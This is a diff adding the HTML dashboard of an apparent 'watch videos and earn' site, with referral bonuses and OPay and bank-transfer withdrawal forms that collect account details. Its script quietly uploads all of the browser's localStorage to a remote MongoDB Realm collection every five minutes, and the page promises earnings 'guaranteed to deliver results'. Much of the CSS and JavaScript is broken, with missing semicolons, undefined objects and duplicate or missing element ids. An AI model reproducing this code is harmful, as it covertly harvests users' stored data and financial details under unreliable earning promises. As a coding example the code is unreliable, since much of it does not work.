@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Profile</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f0f0;
+    color: #333;
+    margin: 0;
+    padding: 0;
+    color: blue;
+            text-shadow: 3px 4px 8px rgba(0, 0, 0, 0.3);
+}
+header {
+    background-color: #1a1a2e; 
+    color: #e0e0e0; 
+    padding: 15px 0;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); 
+    font-family: 'Poppins', sans-serif; 
+    Text-align:center;
+}
+
+.header-container {
+Text-align:center;
+Font-size:10px;
+    max-width: 1200px
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.logo h1 {
+    font-size: 1.8em;
+    font-weight: 600;
+    display: flex
+    align-items: center;
+    margin: 0;
+}
+
+.logo i {
+    margin-right: 10px;
+    color: #f39c12; /* Accent color */
+}
+
+nav {
+    flex: 1
+    text-align: center
+}
+
+.nav-menu {
+    list-style: none;    Text-align:center;
+    padding: 10;
+    margin: 0;
+    display: none
+    justify-content: flex-end;
+}
+
+.nav-menu li {
+    margin: 0 10px
+}
+
+.nav-link {
+    color: #e0e0e0;
+    text-decoration: none;
+    font-size: 16px;
+    display: block
+    align-items: center;
+    padding: 10px 10px;
+    border-radius: 5px;
+    transition: background-color 0.3s ease, color 0.3s ease;
+}
+
+.nav-link i {
+    margin-right: 8px;
+}
+
+.nav-link:hover {
+    background-color: #f39c12; 
+    color: #1a1a2e;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+.container {
+    background-color: #fff;
+    margin: 20px auto;
+    padding: 20px;
+    border-radius: 8px;
+    max-width: 500px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+.hidden {
+    display: none;
+}
+
+h2, h3 {
+    color: #0044cc;
+}
+
+.payment-buttons button {
+    margin-right: 10px;
+    padding: 10px 20px;
+    background-color: #0044cc;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+.payment-buttons button:hover {
+    background-color: #003399;
+}
+
+form input[type="text"], form input[type="number"] {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+}
+
+form button {
+    background-color: #28a745;
+    color: #fff;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+form button:hover {
+    background-color: #218838;
+}
+
+.referral-info, .withdrawal-info {
+    margin-bottom: 10px;
+    Display:center;
+    Font-weight:bold;
+    Font-size:10px;
+    Text-align:center;
+}
+.withdrawal-info6{
+background: #ffffff;
+    margin-bottom: 10px;
+    Display:center;
+    Font-weight:bold;
+    Font-size:10px;
+    Text-align:center;
+
+}
+
+.container2 {
+    background-image: url("hr.png");
+background-size: contain;
+background-repeat: no-repeat
+background-position: center;
+    margin: 15px auto;
+    padding: 20px;
+    border-radius: 8px;
+    width: 80%;
+    max-width: 300px
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.10);
+}
+/* Babban section */
+.tgh {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    padding: 0px;
+    background-color: #f4f4f4;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    max-width: 400px;
+    margin: auto;
+}
+
+/* Input na text */
+.tgh input[type="text"] {
+    padding: 10px;
+    border: 2px solid #007bff;
+    border-radius: 5px;
+    font-size: 6px;
+    color: #333;
+    background-color: #fff;
+    box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
+    width: 100%;
+    max-width: 200px;
+}
+
+/* Button */
+.tgh button {
+    padding: 8px 16px;
+    border: none;
+    border-radius: 5px;
+    background-color: #007bff;
+    color: white;
+    font-size: 3px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.tgh button:hover {
+    background-color: #0056b3;
+}
+footer {
+            background: #ccc;
+            color: blue;
+            padding: em;
+            text-decoration: none;
+      display: inline-flex; 
+         margin-right: 0;
+            text-align: center;
+            text-shadow: 3px 4px 4px rgba(0, 0, 0, 0.3);
+            color: #3c2bff;
+            font-size: 10px;
+            position: fixed;
+            bottom:0;
+            width: 100%;
+            display: flex;
+            justify-content: space-around;
+            transition: background 0.3s ease;
+               
+        }
+
+        footer a {
+        
+            color: black;
+            text-decoration: none;
+            margin:  0px;
+            display: flex;          
+            flex-direction: column;           
+            align-items: center;
+            gap:0;
+            margin-buttom: -0em;     
+         Font-weight:bold;
+         Font-size:15px;
+         text-shadow: 3px 4px 4px rgba(70, 0, 0, 0.3);
+        }
+
+        .icon{
+            
+            font-size: 18px;
+            Text-color:write;
+            
+            text-shadow: 3px 4px 4px rgba(70, 0, 0, 0.3);
+            margin-bottom: -0px;
+            color: blu;
+            
+        }
+       .icon:hover {
+    background-color: #f39c12; 
+    color: #1a1a2e;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+ /* Tsara notification bell */
+        .notification-bell {
+            position: relative;
+            cursor: pointer;
+        }
+
+        .notification-bell .bell-icon {
+            font-size: 24px;
+            color: #007bff;
+        }
+
+        .notification-bell .notification-count {
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            background-color: #ff3b3b;
+            color: #fff;
+            border-radius: 50%;
+            padding: 5px;
+            font-size: 12px;
+        }
+  .container2{
+           Text-align:center;
+           Font-weight:bold;
+           Font-size:16px;
+           Color:#1100f6;
+       }
+       
+       .butto, .button3 {
+    background-color: #4CAF50; /* Green */
+    border: none;
+    color: white;
+    padding: 15px 32px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block
+    font-size: 3px;
+    margin: 4px 2px;
+    cursor: pointer;
+    border-radius: 12px;
+    transition: 0.4s ease-in-out;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+}
+
+.button:hover, .button3:hover {
+    background-color: #45a049; /* Darker Green */
+    transform: scale(1.1) rotate(5deg);
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
+}
+
+.button:active, .button3:active {
+    background-color: #3e8e41;
+    transform: scale(1.2) rotate(-5deg);
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.7);
+    transition: 0.2s;
+}
+
+.button, .button3 {
+    position: relative;
+    overflow: hidden;
+}
+
+.button::before, .button3::before {
+    content: "";
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 300%;
+    height: 300%;
+    background: rgba(255, 255, 255, 0.15);
+    transition: all 0.75s;
+    border-radius: 50%;
+    transform: translate(-50%, -50%) scale(0);
+}
+
+.button:hover::before, .button3:hover::before {
+    transform: translate(-50%, -50%) scale(1);
+}  
+      .elegant-subtitle {
+        font-family: 'Times New Roman', serif;
+        font-size: 1.5em;
+        color: #6a0572;
+        text-align: center;
+        letter-spacing: 2px;
+        margin-bottom: 20px;
+    } 
+        .menu-container {
+    max-width: 600px;
+    margin: 50px auto;
+    background: rgba(0, 0, 0, 0.5);
+    padding: 20px;
+    border-radius: 10px;
+    text-align: center;
+}
+
+.menu-title {
+    font-size: 2em;
+    margin-bottom: 20px;
+}
+
+.menu-item {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 10px 0;
+}
+
+.icon {
+    font-size: 1.5em;
+    margin-right: 10px;
+}
+
+.menu-item a {
+    color: #fff;
+    text-decoration: none;
+    font-size: 1.2em;
+    transition: color 0.3s;
+}
+
+.menu-item a:hover {
+    color: #ffd700;
+}
+
+.cta-button {
+    background: #ff5722;
+    color: #fff;
+    border: none;
+    padding: 15px 30px;
+    font-size: 1.2em;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background 0.3s;
+}
+
+.cta-button:hover {
+    background: #e64a19;
+}
+.container70 {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 40px 60px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+            max-width: 600px;
+            text-align: center;
+            Font-weight:bold;
+            Font-size:8px;
+            transform: scale(1);
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .container:hover {
+            transform: scale(1.05);
+        }
+
+        .magical-text {
+            font-size: 1.6em;
+            line-height: 1.8;
+            color: #f0e5e5;
+            text-shadow: 3px 3px 10px rgba(0, 0, 0, 0.7);
+        }
+
+        .magical-text span {
+            color: #ff9a9e;
+            font-weight: bold;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .container70 {
+            animation: fadeIn 1.5s ease-out;
+        }
+        .contact-form,
+.contact-info {
+    width: 90%;
+    margin: 20px 0;
+    padding: 20px;
+    Text-align:center;
+    Font-weight:bold;
+    Font-size:16px;
+    Color:black;
+    background-color: #fff;
+    border-radius: 10px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+}
+
+.contact-form h3,
+.contact-info h3 {
+    color: #004d99;
+    margin-bottom: 20px;
+}
+
+.contact-form label,
+.contact-info p {
+    display: none;
+    width: 20
+    margin-bottom: 10px;
+    color: #666;
+}
+
+
+
+.social-media {
+    margin-top: 20px;
+}
+
+.social-media h3 {
+    color: #004d99;
+    margin-bottom: 15px;
+}
+
+.social-media a {
+    margin-right: 15px;
+}
+
+.social-media img {
+    width: 45px;
+    height: 45px;
+    border-radius: 5px;
+    transition: transform 0.3s ease;
+}
+
+.social-media img:hover {
+    transform: scale(1.1);
+}
+.contact-info{
+Display:center;
+    width: 85%;
+}
+/* Tsarin WhatsApp Icon */
+.whatsapp-icon-container {
+    position: fixed;
+    bottom: 20px;    
+    right: 2px;
+    z-index: 1000;
+    width: 30px;
+    height: 30px;
+   Top:300px; background-color: #25D366;
+    border-radius: 50%;
+    border: 5px solid white;
+    padding: 17px;
+    box-shadow: 0px 4px 8px rgba(80, 0, 60, 0.20);
+    transition: background-color 0.3s ease, box-shadow 0.3s ease;
+    text-align: center;
+    color: white;
+    font-family: Arial, sans-serif;
+}
+
+.whatsapp-icon-container:hover {
+    background-color: #128C7E;
+    box-shadow: 0px 6px 12px rgba(0, 0, 0, 0.3);
+}
+
+.whatsapp-icon-container img {
+    width: 50px;
+    height: 40px;
+    Top:20px;
+}
+
+.whatsapp-text {
+    margin: 0;
+    padding: 0;
+}
+
+.whatsapp-text .admin,
+.whatsapp-text .chat {
+    font-size: 7px;
+    font-weight: bold;
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+}
+    
+  </style>
+</head>
+<body>    
+    <header>
+    <div class="header-container">
+                     <div class="logo">
+        <h1 class="fas fa-user" id="welcomeText"> <span id="userFullName"></span>Dashboard,!</h1>
+        <div>
+        <nav>
+            <ul class="nav-menu">                              
+                <a href="index.html" class="nav-link"><i class="fas fa-home"></i>Home</a>
+               <a href="leaning.html" class="nav-link"><i class="fas fa-book"></i>Learning</a> 
+                       
+            </nav>
+        </div>
+        <div>
+            <a class="notification-bell"><i class="fas fa-bell bell-icon"></i><span class="notification-count">0</span></a>
+        </div>
+</header>
+    <main>
+    <section     class="container2">
+         <button class="button" onclick="switchToNaira()">₦</button >
+         🔁       <button class="button" onclick="switchToDollar()">$</button> 
+          <p>Balance: <span class="currencyBalance" id="userBalance">₦0</span></p>
+                     </section>
+                     <center>
+       <h4 class="elegant-subtitle">Stars view video or images and get money Now</h4>
+           
+           <button class="button3" onclick="window.location.href='tasks-video.html'">Watch Videos & Earn</button> 
+           <button class="button3" onclick="window.location.href='tasks-images.html'">View Images & Earn</button>  </center>       </section> 
+        <blockquote class="quote">"Invite your friends and earn ₦500. Minimum withdrawal amount: ₦500." - Start invete Now</blockquote>
+
+<style>
+    .quote {
+        font-family: 'Georgia', serif;
+        font-size: 1.5em;
+        color: #555;
+        margin: 20px auto;
+        padding: 10px 20px;
+        border-left: 5px solid #764ba2;
+        background-color: #f9f9f9;
+        font-style: italic;
+    }
+  
+</style>
+        <section class="tgh">
+            <input type="text" id="referralLink" value="" readonly>
+            <button onclick="copyReferralLink()">Copy Referral Link</button>
+        </section>
+        
+        
+        <section>
+
+        <div class="container70">
+        <p class="magical-text">
+            Discover valuable tips and <span>unlock your full potential!</span> Dive into our content and learn how to make real money online using legit apps and platforms that are <span>simple</span>, <span>effective</span>, and <span>guaranteed to deliver results</span>.
+        </p>
+    </div>
+        </section>
+        
+      <section>
+           <div class="menu-container">
+        <h1 class="menu-title">Stars Leaning</h1>
+        <div class="menu-item">
+            <i class="icon">💰</i>
+            <a href="leaning.html">How to Make Money Online</a>
+        </div>
+        <div class="menu-item">
+            <i class="icon">📱</i>
+            <a href="leaning.html">Legit Apps and Platforms</a>
+        </div>
+        <button class="cta-button" onclick="window.location.href='leaning.html'">Click Now</button>
+    </div>
+      </section> 
+
+        <section class="container withdrawal-container">
+            <h3> Withdrawal</h3>
+            <p class="withdrawal-info6">"The minimum withdrawal is ₦500 via OPay or ₦1000 via bank transfer. We process payments at any time, and you will receive a notification on your dashboard once the payment is made. If you encounter any issues, you can contact us.".</p>
+            <p>Balance: ₦<span id="userBalance">0</span></p>
+
+            <div class="payment-buttons">
+                <button class ="button3"onclick="openOpayForm()">Opay </button>
+                <button class ="button3"onclick="openBankTransferForm()">Bank Transfer</button>
+            </div>
+
+            <!-- OPay Payment Form -->
+            <form id="opayForm" class="hidden">
+                <h4>OPay Payment</h4>
+                <label>Amount: ₦<span id="opayAmount">0</span></label>
+                <input type="text" id="opayAccountNumber" placeholder="Enter OPay Account Number">
+                <input type="text" id="opayCallNumber" placeholder="Enter Call Number">
+                <button type="button" onclick="submitOpayForm()">Submit</button>
+            </form>
+
+            <!-- Bank Transfer Form -->
+            <form id="bankForm" class="hidden">
+                <h4>Bank Transfer Payment</h4>
+                <label>Amount: ₦<span id="bankAmount">0</span></label>
+                <input type="text" id="bankName" placeholder="Enter Bank Name">
+                <input type="text" id="bankAccountName" placeholder="Enter Bank Account Name">
+                <input type="text" id="bankAccountNumber" placeholder="Enter Bank Account Number">
+                <button type="button" onclick="submitBankForm()">Submit</button>
+            </form>
+        </section>
+    </main>
+    <footer>                                                                  
+    <a href="tasks-video.html" class="icon"><i class="fas fa-video"></i class="con">Earn by video</a>
+                    <a href="tasks-images.html" class="icon"><i class="fas fa-image"></i class="con"> Earn by img</a>
+             
+    </footer>
+    
+    
+    <section>
+       <div class="contact-info">
+            <h3>Contact Information</h3>
+            
+        Admin    
+            <p><strong>Email:</strong ></p><p>makemoney7@gmail.com</p>
+            
+            <div class="social-media">
+                <h3>Follow Us:</h3>
+                <a href="https://www.facebook.com/Haruna lawali" target="_blank">
+                    <img src="facebook.png" alt="Facebook">
+                </a>
+                <a href="https://wa.me/08166836059?text=Hello%2C%20I'm%20a%20new%20customer" target="_blank">
+                    <img src="what.png" alt="WhatsApp">
+                </a>
+                <a href="tel:+2348166836059">
+                    <img src="call.png" alt="Call Us">
+                </a>
+                <a href="mailto:lawaliharuna943@gmail.com.">
+                    <img src="gmail.png" alt="Send Email">
+                </a>
+            </div>
+        </div>
+    </section>
+<div class="whatsapp-icon-container">
+    <div class="whatsapp-text">
+        <div class="admin">NG Admin! Chat</div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
+        <div class="chat"></div>
+    </div>
+</div>
+<script>    
+document.querySelector('.whatsapp-icon-container').addEventListener('click', function() {
+    window.open('https://wa.me/08166836059?text=Hello%2C%20I%27m%20a%20new%20customer.%20Meke%20Job%20%26%20Money%2C%20I%20have%20questions', '_blank');
+});
+</script>
+    </section>
+<script src="https://unpkg.com/realm-web@1.4.2/dist/bundle.iife.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+    loadUserData();
+     // Currency switch function
+        function switchToNaira() {
+            document.getElementById('currencyBalance').innerText = '₦500';
+        }
+
+        function switchToDollar() {
+            // Assuming exchange rate is 1 Dollar = 1250 Naira
+            document.getElementById('currencyBalance').innerText = '$' + (500 / 1250).toFixed(2);
+        }
+
+    function loadUserData() {
+        const user = JSON.parse(localStorage.getItem('user'));
+
+        if (user) {
+            document.getElementById('userFullName').innerText = user.fullName;
+            document.getElementById('referralLink').value = `https://www.yoursite.com/register.html?ref=${user.username}`;
+            document.getElementById('userBalance').innerText = user.balance || '0';
+            document.getElementById('opayAmount').innerText = user.balance || '0';
+            document.getElementById('bankAmount').innerText = user.balance || '0';
+            updateReferralBonus(user.balance);
+        } else {
+            alert('User data not found. Redirecting to registration page.');
+            window.location.href = 'register.html';
+        }
+    }
+
+    function updateReferralBonus(balance) {
+        const bonusElement = document.getElementById('referralBonus');
+        if (balance >= 500) {
+            bonusElement.innerText = balance;
+        } else {
+            bonusElement.innerText = '0';
+        }
+    }
+});
+
+// Function to copy referral link
+        function copyReferralLink() {
+    const referralLinkInput = document.getElementById("referralLink");
+    referralLinkInput.select();
+    referralLinkInput.setSelectionRange(0, 99999); /* For mobile devices */
+    document.execCommand("copy");
+
+    // Show a confirmation message
+    alert("Referral link copied to clipboard!");
+}
+// Function to handle currency switch between Naira and Dollar
+function switchCurrency(currency) {
+    const balanceDisplay = document.getElementById("referralBonus");
+    const userBalance = parseFloat(balanceDisplay.innerText.replace(/[^0-9.-]+/g,""));
+
+    if (currency === "dollar") {
+        balanceDisplay.innerText = `$${(userBalance / 1250).toFixed(2)}`;
+    } else {
+        balanceDisplay.innerText = `₦${(userBalance * 1250).toFixed(2)}`;
+    }
+}
+
+// Function to show withdrawal container on button click
+function showWithdrawalContainer() {
+    const withdrawalContainer = document.querySelector(".withdrawal-container");
+    withdrawalContainer.classList.toggle("hidden");
+}
+
+function openOpayForm() {
+    const balance = parseFloat(document.getElementById('userBalance').innerText);
+    if (balance < 500) {
+        alert('Minimum amount withdrawal 500 Naira for OPay.');
+        return;
+    }
+    document.getElementById('opayForm').classList.remove('hidden');
+    document.getElementById('bankForm').classList.add('hidden');
+}
+
+function openBankTransferForm() {
+    const balance = parseFloat(document.getElementById('userBalance').innerText);
+    if (balance < 1000) {
+        alert('Minimum amount withdrawal 1000 Naira for bank transfer.');
+        return;
+    }
+    document.getElementById('bankForm').classList.remove('hidden');
+    document.getElementById('opayForm').classList.add('hidden');
+}
+
+function submitOpayForm() {
+    const opayAccountNumber = document.getElementById('opayAccountNumber').value;
+    const opayCallNumber = document.getElementById('opayCallNumber').value;
+    const amount = parseFloat(document.getElementById('opayAmount').innerText);
+
+    if (!opayAccountNumber || !opayCallNumber) {
+        alert('Please fill in all OPay account details.');
+        return;
+    }
+
+    saveWithdrawalDetails(amount, 'OPay', opayAccountNumber, opayCallNumber);
+}
+
+function submitBankForm() {
+    const bankName = document.getElementById('bankName').value;
+    const bankAccountName = document.getElementById('bankAccountName').value;
+    const bankAccountNumber = document.getElementById('bankAccountNumber').value;
+    const amount = parseFloat(document.getElementById('bankAmount').innerText);
+
+    if (!bankName || !bankAccountName || !bankAccountNumber) {
+        alert('Please fill in all bank transfer details.');
+        return;
+    }
+
+    saveWithdrawalDetails(amount, 'Bank Transfer', bankName, bankAccountName, bankAccountNumber);
+}
+
+function saveWithdrawalDetails(amount, method, ...details) {
+    const user = JSON.parse(localStorage.getItem('user'));
+            if (!user) {
+            alert('User data not found. Cannot process withdrawal.');
+            return;
+        }
+        
+        // Function to send user data from localStorage to MongoDB Realm
+    async function sendDataToMongoDB() {
+        const credentials = Realm.Credentials.anonymous();
+        const user = await app.logIn(credentials);
+        const mongo = user.mongoClient("mongodb-atlas");
+        const collection = mongo.db("myuser").collection("User");
+
+        // Send all localStorage data to MongoDB Realm
+        for (let i = 0; i < localStorage.length; i++) {
+            const userData = JSON.parse(localStorage.getItem(localStorage.key(i)));
+            await collection.insertOne(userData);
+        }
+        
+        console.log("All localStorage data have been sent to MongoDB Realm");
+    }
+           
+    // Set an interval to send data from localStorage to MongoDB Realm every 5 minutes
+    setInterval(() => {
+        if (isLocalStorageAvailable() && !isLocalStorageFull()) {
+            sendDataToMongoDB();
+        }
+    }, 300000); // 300000 milliseconds = 5 minutes
+
+        // Get the available balance from localStorage
+        const balance = parseFloat(localStorage.getItem('balance')) || 0;
+
+        // Set balance in the input field
+        document.getElementById('withdrawAmount').value = balance;
+
+        // Handle form submissions
+        const opayForm = document.getElementById('opayForm');
+        const bankForm = document.getElementById('bankForm');
+
+        opayForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const withdrawAmount = parseFloat(document.getElementById('withdrawAmount').value);
+            const opayAccountNumber = document.getElementById('opayAccountNumber').value;
+            const opayCallNumber = document.getElementById('opayCallNumber').value;
+
+            if (withdrawAmount < 500) {
+                alert('Minimum withdrawal amount is 500 Naira for OPay.');
+                return;
+            }
+
+            processWithdrawal('OPay', withdrawAmount, opayAccountNumber, opayCallNumber);
+        });
+
+        bankForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const withdrawAmount = parseFloat(document.getElementById('withdrawAmount').value);
+            const bankName = document.getElementById('bankName').value;
+            const bankAccountName = document.getElementById('bankAccountName').value;
+            const bankAccountNumber = document.getElementById('bankAccountNumber').value;
+
+            if (withdrawAmount < 1000) {
+                alert('Minimum withdrawal amount is 1000 Naira for bank transfers.');
+                return;
+            }
+
+            processWithdrawal('Bank Transfer', withdrawAmount, bankName, bankAccountName, bankAccountNumber);
+        });
+
+        function processWithdrawal(type, amount, ...details) {
+            if (amount > balance) {
+                alert('Insufficient balance.');
+                return;
+            }
+
+            // Update balance
+            const newBalance = balance - amount;
+            localStorage.setItem('balance', newBalance);
+
+            // Create a withdrawal object
+            const withdrawal = {
+                type: type,
+                amount: amount,
+                details: details,
+                date: new Date().toLocaleString(),
+                status: 'Pending'
+            };
+
+            // Save withdrawal to localStorage
+            let withdrawals = JSON.parse(localStorage.getItem('withdrawals')) || [];
+            withdrawals.push(withdrawal);
+            localStorage.setItem('withdrawals', JSON.stringify(withdrawals));
+
+            alert('Your withdrawal is pending, waiting for admin approval.');
+            location.reload();
+        }
+        
+        // Function to show notification bell icon
+function showNotificationBell() {
+    // Code to display notifications
+    alert("Showing notifications...");
+}
+
+// Example notification data
+const notifications = [
+    { id: 1, message: "Your withdrawal of ₦500 was successful.", timestamp: "2024-08-01 10:30 AM" },
+    { id: 2, message: "Your withdrawal is pending.", timestamp: "2024-08-02 12:45 PM" }
+];
+
+// Function to display notifications
+function displayNotifications() {
+    const notificationContainer = document.createElement("div");
+    notificationContainer.classList.add("notification-container");
+
+    notifications.forEach(notification => {
+        const notificationElement = document.createElement("div");
+        notificationElement.classList.add("notification-item");
+        notificationElement.innerHTML = `<p>${notification.message}</p><span>${notification.timestamp}</span>`;
+        notificationContainer.appendChild(notificationElement);
+    });
+
+    document.body.appendChild(notificationContainer);
+}
+
+// Event listener for notification bell icon click
+document.getElementById("notificationBell").addEventListener("click", displayNotifications); 
+    }
+    </script>
+</body>
+</html>    
